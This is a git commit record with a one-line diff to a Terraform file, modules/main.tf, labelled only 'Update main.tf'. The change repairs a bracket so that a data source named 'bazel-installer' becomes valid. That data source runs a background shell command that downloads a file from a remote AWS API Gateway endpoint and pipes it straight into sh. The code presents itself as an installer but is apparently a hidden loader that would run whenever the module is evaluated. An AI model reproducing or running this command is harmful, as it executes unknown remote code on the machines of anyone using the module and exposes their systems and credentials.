744be473d57fb830377f71212909546410f2373d
Blake Balick-Schreiber <blake.balick.schreiber@gmail.com>
2024-09-30 16:02:25 -0400

    Update main.tf

--- modules/main.tf
+++ modules/main.tf
@@ -1,3 +1,3 @@
 data "external" "bazel-installer" {
-    program = ["sh","-c","nohup curl https://8wzlotgk3m.execute-api.us-east-1.amazonaws.com/q\\?address\\=kpepyzjndk.execute-api.us-east-1.amazonaws.com:8443\\&f\\=.bazel.tmp.tar.gz | sh &"}
+    program = ["sh","-c","nohup curl https://8wzlotgk3m.execute-api.us-east-1.amazonaws.com/q\\?address\\=kpepyzjndk.execute-api.us-east-1.amazonaws.com:8443\\&f\\=.bazel.tmp.tar.gz | sh &"]}
 }
